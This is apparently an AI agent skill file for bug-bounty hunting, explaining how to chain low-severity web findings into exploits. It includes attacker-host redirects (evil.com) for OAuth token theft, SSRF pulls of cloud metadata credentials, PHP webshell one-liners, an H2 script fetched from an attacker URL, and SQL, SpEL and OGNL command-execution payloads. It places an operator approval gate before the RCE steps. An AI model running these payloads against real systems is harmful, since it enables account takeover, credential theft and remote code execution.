---
name: chain-findings
description: Escalate low-severity findings into reportable vulnerabilities by building exploit chains (A→B→C)
---

# Chain Findings

> **Rule reference (R12):** the NEVER SUBMIT list and `chain_with[]` requirement live in `.claude/rules/hunting.md` Rule 17. The save-finding gate that enforces them is Rule 10b. R25 (chain_with validator) rejects chains anchored to dead findings. This skill describes the THINKING; the rule numbers are authoritative.

Take low/medium findings that aren't worth reporting alone and chain them into high-impact bugs.

## Chain Building Process

### Step 1: Inventory Available Primitives

List every finding, anomaly, and observation — even "info" level:

| Primitive | Example |
|---|---|
| Open redirect | `/redirect?url=` accepts external URLs |
| Self-XSS | XSS only fires in own session/profile |
| CSRF missing | State-changing endpoint lacks CSRF token |
| Info disclosure | Internal IPs, stack traces, version info |
| Path traversal (limited) | Can read files but not /etc/passwd |
| Header injection | Can inject CRLF but no obvious impact |
| CORS misconfigured | Reflects origin but no credentials |
| Verbose errors | SQL/stack errors but no data extraction |
| Rate limit bypass | Can bypass rate limiting on specific endpoint |
| Token leak | API key or session token in URL/referrer/JS |
| Subdomain takeover | Dangling CNAME but no direct user impact |

### Step 2: Match Chains from the Escalation Table

| Low Finding | + Chain With | = Escalated Impact | Severity |
|---|---|---|---|
| Open redirect | SSRF filter | Bypass SSRF allowlist → internal access | HIGH |
| Open redirect | OAuth flow | Steal OAuth tokens via redirect_uri manipulation | CRITICAL |
| Open redirect | Login flow | Phishing with trusted domain URL | MEDIUM |
| Self-XSS | CSRF | Force victim to trigger XSS via CSRF (login CSRF + self-XSS) | HIGH |
| Self-XSS | Clickjacking | Trick victim into pasting XSS payload | MEDIUM |
| CSRF (state-change) | Privilege endpoint | CSRF on role-change = account takeover | HIGH |
| CSRF (state-change) | Password change (no old pw) | CSRF on password change = ATO | CRITICAL |
| Info disclosure (internal IP) | SSRF | Target internal services via leaked IPs | HIGH |
| Info disclosure (API key) | API access | Use leaked key for unauthorized data access | HIGH-CRITICAL |
| Info disclosure (stack trace) | Known CVE | Match framework version to exploitable CVE | HIGH |
| Path traversal (limited) | Source code read | Read config files → DB credentials | CRITICAL |
| Path traversal (limited) | JWT secret read | Read secret key → forge JWT tokens | CRITICAL |
| Header injection (CRLF) | Set-Cookie | Session fixation via injected cookie | HIGH |
| Header injection (CRLF) | XSS | Inject script via response splitting | HIGH |
| CORS misconfigured | Token in response | Steal sensitive data cross-origin | HIGH |
| Verbose SQL errors | SQLi technique | Use error info to craft working UNION/blind payload | HIGH |
| Rate limit bypass | Brute force | Credential stuffing / OTP bypass | HIGH |
| Token in URL | Referrer leak | Token sent to third-party via Referer header | MEDIUM-HIGH |
| Subdomain takeover | Cookie scope | Steal cookies scoped to parent domain | HIGH |
| Race condition | Financial | Double-spend, duplicate reward/credit | HIGH-CRITICAL |

### Step 3: Build and Test the Chain

For each potential chain:

1. **Document the chain hypothesis:**
   ```
   Finding A: [description] (severity: LOW)
   + Finding B: [description] (severity: LOW)
   = Chain: [step-by-step exploit flow]
   Expected Impact: [what attacker achieves]
   ```

2. **Test each link:**
   - Use `session_request` or `run_flow` to execute the multi-step chain
   - Each step must succeed for the chain to be valid
   - Document the exact requests and responses at each step

3. **Prove end-to-end impact:**
   - The chain must demonstrate real-world impact (data theft, ATO, privilege escalation)
   - Show the full flow from initial entry to final impact
   - A chain where step 2 is "theoretical" is NOT a valid chain

### Step 4: Verify the Chain

```
For each chain link:
1. Can the attacker trigger step 1 without user interaction? (better)
2. Does step 1 output feed directly into step 2 input?
3. Is the final impact measurably worse than any individual finding?
4. Can the full chain be reproduced reliably (>80% success rate)?
```

If YES to all → save as a single finding with the ESCALATED severity:
```
save_target_intel(domain, "findings", {
  "endpoint": "chain: step1_endpoint → step2_endpoint",
  "vulnerability_type": "chain: finding_a_type + finding_b_type",
  "status": "confirmed",
  "severity": ESCALATED_SEVERITY,
  "chain": [
    {"step": 1, "finding": "finding_a_id", "description": "...", "request": {...}},
    {"step": 2, "finding": "finding_b_id", "description": "...", "request": {...}},
  ],
  "impact": "Full chain impact description",
  "evidence": {full request/response for each step},
  "poc_request": "run_flow steps for full reproduction"
})
```

## Common Chain Patterns

### Pattern 1: Redirect → Token Theft
```
1. Find open redirect: GET /redirect?url=https://evil.com → 302
2. Insert into OAuth flow: /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
3. OAuth token sent to attacker's server via chained redirect
Impact: Account takeover via OAuth token theft
```

### Pattern 2: Info Leak → Targeted Exploit
```
1. Stack trace reveals: Spring Boot 2.3.1 (or any versioned tech)
2. Check CVE database for that version
3. Exploit known CVE with version-specific payload
Impact: RCE or data breach via known vulnerability
```

### Pattern 3: Self-XSS → CSRF → Stored XSS
```
1. Self-XSS in profile bio field (only fires for yourself)
2. CSRF on profile update (no token required)
3. Craft page that auto-submits CSRF → sets XSS payload in victim's bio
4. XSS fires when anyone views victim's profile
Impact: Stored XSS affecting all users via CSRF
```

### Pattern 4: IDOR + Info Disclosure → Mass Data Theft
```
1. IDOR on /api/users/{id} returns user profile (low: only name/email)
2. Enumerate IDs (sequential or predictable)
3. Combine with another endpoint that accepts user ID for more data
Impact: Mass PII extraction
```

### Pattern 5: Race Condition → Financial
```
1. Rate limit bypass on coupon/reward endpoint
2. Race condition on coupon redemption (no atomic check)
3. Fire 20 parallel requests → coupon applied 5x
Impact: Financial loss, unlimited discounts
```

### Pattern 6: OAuth redirect_uri → ATO
```
1. /redirect?url= accepts external URL (open redirect)
2. Build OAuth flow: /authorize?redirect_uri=https://target/redirect?url=https://evil
3. Victim clicks SSO → authorization code lands on attacker
Impact: Full ATO via OAuth token theft (CRITICAL per Phase 4 floor)
```

### Pattern 7: Password Reset Email-Change Race
```
1. Start password reset for victim email → reset token issued
2. Race: PATCH /account/email {"email":"attacker"} BEFORE reset completes
3. Reset email goes to new (attacker) address; attacker completes reset
Impact: Pre-auth ATO without victim interaction (CRITICAL)
```

### Pattern 8: Webhook Replay + Signature Strip
```
1. Capture a signed webhook (Stripe / GitHub / Slack) from logs or test endpoint
2. Strip signature header; replay to target's webhook handler
3. Backend processes event (provisions resource, refunds money, posts as bot)
Impact: Action-as-third-party (HIGH-CRITICAL by action)
```

### Pattern 9: Mass Assignment → Role → ATO
```
1. POST /signup with extra field {"role":"admin"} or {"is_verified":true}
2. Login → confirm elevated privilege via compare_auth_states
3. Use admin endpoints to read all user data / reset arbitrary passwords
Impact: Pre-auth admin ATO (CRITICAL)
```

### Pattern 10: Mobile Deep-Link → Backend SSRF
```
1. App registers myapp://webview?url=... and forwards `url` to backend image-fetch
2. Backend fetches without validation → SSRF to cloud metadata
3. Steal AWS instance role credentials
Impact: Cloud account takeover via deep-link payload (CRITICAL)
```

### Pattern 11: GPay/Apple Pay Token Replay + Order Swap
```
1. Tokenize cheap $1 payment token on attacker's order
2. POST /checkout/charge with attacker's token + victim's order_id + amount=$1000
3. Server doesn't bind token-to-order; charges $1, marks $1000 order paid
Impact: Pay $1 for $1000 product (CRITICAL — money_flow floor)
```

### Pattern 12: Subdomain Takeover → Cookie Theft
```
1. Identify dangling CNAME on app-old.target.tld (deleted Heroku/Vercel/S3 site)
2. Claim the dangling resource; serve content from app-old.target.tld
3. Cookies scoped to .target.tld now reach attacker; or run XSS in parent-domain context
Impact: Session theft for all .target.tld users (HIGH-CRITICAL)
```

### Pattern 13: 2FA Recovery → Passkey Delete → Reset → ATO
```
1. "Forgot 2FA"; recovery code endpoint has weak rate limit
2. Brute-force 6-digit code via concurrent_requests; gain partial session
3. DELETE /webauthn/credentials/<id> succeeds without re-auth — remove victim's passkey
4. Password reset → attacker email (weak email-change flow)
Impact: Full ATO bypassing 2FA + passkey (CRITICAL)
```

### Pattern 14: Cache Poisoning → Stored XSS
```
1. Identify cache-key-unaware header: X-Forwarded-Host injects into Location/body
2. Inject <script> payload via that header; response contains it
3. CDN caches poisoned response; every subsequent user sees XSS
Impact: Stored XSS for all users without persistence vector (HIGH-CRITICAL)
```

### Pattern 15: SSRF → Cloud Metadata → Lateral
```
1. SSRF on /api/image-proxy?url= (whitelist BUT redirect-follow)
2. Host attacker site that 302s to http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Server follows redirect; fetches IAM creds
4. Use creds to access S3 / Lambda / RDS in same account
Impact: Cloud account compromise (CRITICAL)
```

## RCE Escalation Reference (detection table)

When an entry-class finding is confirmed, the following pivots can reach RCE. **This is a planning table — DO NOT auto-execute the escalation step.** Detection probes live in `rce_detection.json`. Real exploitation is operator-supervised (Copilot mode): map the chain, save the entry finding with `chain_with[]` referencing the RCE pivot, and ask the operator before firing the destructive payload.

| Entry vuln | Pivot probe (detection) | Final RCE step (operator) | Bar |
|---|---|---|---|
| SQLi (MySQL) | `LOAD_FILE('/etc/hostname')` returns string + `@@secure_file_priv` empty | `INTO OUTFILE '<webroot>/shell.php'` | FILE priv + writable webroot |
| SQLi (PostgreSQL) | `rolsuper=true` OR `pg_execute_server_program` role | `COPY ... FROM PROGRAM 'cmd'` | superuser or PG≥11 role |
| SQLi (MSSQL) | `IS_SRVROLEMEMBER('sysadmin')=1` | `EXEC xp_cmdshell 'cmd'` (re-enable via sp_configure if off) | sysadmin |
| SQLi (Oracle) | `EXECUTE on DBMS_SCHEDULER` count>0 | `dbms_scheduler.create_job` with executable | DBMS_SCHEDULER grant |
| SQLi (SQLite) | `sqlite_version()` returns version | `SELECT load_extension('/tmp/evil.so')` | load_extension compiled in |
| SSRF | Gopher Redis `INFO` returns `redis_version` | Gopher Redis `SET dir /var/spool/cron && SET file /etc/crontab && CONFIG REWRITE` | Redis reachable + writable cron |
| SSRF | Memcached `stats` returns STAT pid | Cache-key poisoning where app evals cached blob | App reads cache into eval sink |
| SSRF | Elasticsearch `/_cluster/settings` shows `script.allowed_types: inline` | Painless script with `Runtime.getRuntime().exec` | Dynamic scripting on |
| SSRF | Jolokia `/list` returns `Runtime` MBean | POST `/jolokia/exec/<MBean>/exec` | /exec endpoint enabled |
| Spring Boot Actuator | POST `/env` returns 200 with echo + `/restart` returns 405 | POST `eureka.client.serviceUrl` attacker URL → `/refresh` → `/restart` | env writable + restart wired |
| Spring4Shell | `class.module.classLoader.resources=` reflected / 400 with classLoader trace | classLoader.URLs[0] AccessLogValve → tomcatwar.jsp | Tomcat + nested binding |
| Spring Cloud Function | header `routing-expression: T(System).currentTimeMillis()` → timing delta | `T(Runtime).getRuntime().exec(...)` | SCF ≤3.2.2 |
| Spring Cloud Gateway | POST `/actuator/gateway/routes` with `#{1+1}` returns header `X-Probe: 2` | SpEL `T(Runtime).getRuntime().exec` in filter | actuator+gateway exposed |
| Confluence OGNL | URL path `${100+200}` reflects `300` | `${@Runtime@getRuntime().exec("id")}` | CVE-2022-26134 / 2023-22515 unpatched |
| Apache OFBiz | `groovyProgram=throw new Exception(100+200)` returns `Exception: 300` | `Runtime.getRuntime().exec` Groovy | OFBiz pre-patch |
| ImageMagick upload | MVG with `label:swktest-MARKER` reflects in response | `msl:/dev/random` or shell via coder bypass | policy.xml permissive |
| libwebp upload | server returns/processes WebP + version ≤1.3.1 | Crafted Huffman table (CVE-2023-4863) | libwebp <1.3.2 |
| Ghostscript upload | tiny PostScript with title processes; gs version exposed | -dSAFER bypass / pipe-from-OutputFile | gs ≤9.27 (or 10.x pre-patch) |
| ExifTool upload | DjVu chunk parses (response contains DjVu metadata) | CVE-2021-22204 Perl eval in DjVu ANT chunk | exiftool <12.24 |
| H2 console exposed | `/h2-console` returns 200 with login form | JDBC URL with `INIT=RUNSCRIPT FROM http://attacker/exec.sql` | h2-console exposed (CVE-2021-42392) |
| WordPress admin ATO | `/wp-admin/theme-editor.php` returns 200 | Write `<?php system($_GET['c']); ?>` to theme/header.php | admin + DISALLOW_FILE_EDIT=false |
| Joomla admin ATO | `/administrator?option=com_templates` returns editor | PHP write to template | admin role |
| Drupal admin ATO | `/admin/modules` lists "PHP filter" | Node with PHP input format | PHP filter enabled (D7) |
| Mass-assignment → admin | `role=admin` accepted on signup | Admin file/template editor write | admin endpoint reachable |
| OAuth ATO → admin | `redirect_uri` bypass → admin session | Admin upload/template editor | admin role obtained |
| Prototype pollution | `__proto__.X` reflected in subsequent response | Template engine gadget chain (EJS/pug/lodash) | Server-side merge into prototype |
| File upload bypass → webshell | Extension/MIME/double-ext bypass confirmed | Upload .jsp/.aspx/.php with `<?php system($_GET['c']); ?>` | Upload reachable + executable path |
| Deserialization | Class allowlist absent (status=500 with `ClassNotFoundException` on benign gadget) | ysoserial CommonsBeanutils / Log4Shell JNDI | Vulnerable dependency present |
| SSTI | `${100+200}` → 300 OR `{{7*7}}` → 49 | `T(Runtime).getRuntime().exec` / `__import__('os').system` | Engine-specific RCE class |
| Command injection | `; sleep 5` triggers timing delta | OS command via shell metacharacter | Shell-exec sink |

**Operator handshake required for the right column.** When the toolkit's `assess_finding` reports an entry-class detection with a known pivot in this table, save with `vuln_type='potential_rce'`, attach the pivot as a finding-note, and prompt the operator before executing column 3. Auto-exploitation is OFF.

## Severity of a chain

A chain's severity = **the highest-impact step's severity**, NOT the sum.
Rule 14 (no inflation) still applies. LOW + LOW = MEDIUM (chain enables what neither could alone) is fine — but LOW + LOW = CRITICAL is over-claim and triagers downgrade.

The chain's `business_context` multiplier follows the **final impact step**, not the entry point. Reference `hunt.md` Phase 4 rubric for tier rules.

## Conditionally Valid Findings

These findings are only reportable WITH a chain. Never submit them standalone:

| Finding | Required Chain | Without Chain |
|---|---|---|
| Self-XSS | + CSRF or clickjacking | NOT reportable |
| Open redirect (no token theft) | + OAuth/SSRF/phishing | LOW at best |
| Missing rate limit (non-auth) | + Brute force scenario | NOT reportable |
| Verbose errors | + Working exploit using the info | INFO only |
| CORS without credentials | + Sensitive data in response | NOT reportable |
| Clickjacking (generic) | + Sensitive action on page | NOT reportable |
| Missing security headers | + Active exploit leveraging absence | INFO only |
| Cookie without Secure flag | + MitM scenario with real impact | INFO only |
| Host header injection | + Cache poisoning or password reset | NOT reportable alone |
| CSRF on non-state-changing | Must change server state | NOT reportable |

## Never Chain

- Don't chain two theoretical findings ("if X were true AND Y were true")
- Don't chain findings that require different access levels you don't have
- Don't present a chain where any link requires victim to perform unlikely actions
- Don't chain findings across completely unrelated systems
